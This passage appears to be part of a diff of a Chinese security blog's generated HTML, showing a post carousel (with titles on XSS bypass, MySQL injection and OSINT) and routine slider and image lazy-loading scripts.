src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-11-11</span><a class="blog-slider__title" href="post/8bdb3c95.html" alt="">XSS的混淆与绕过</a><div class="blog-slider__text">本文主要介绍:对XSS混淆技术的总结</div><a class="blog-slider__button" href="post/8bdb3c95.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">本文主要介绍:使用谷歌语法搜索公开信息，利用空间测绘引擎搜索资产，使用Python脚本简单编写被动信息收集的工具</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>
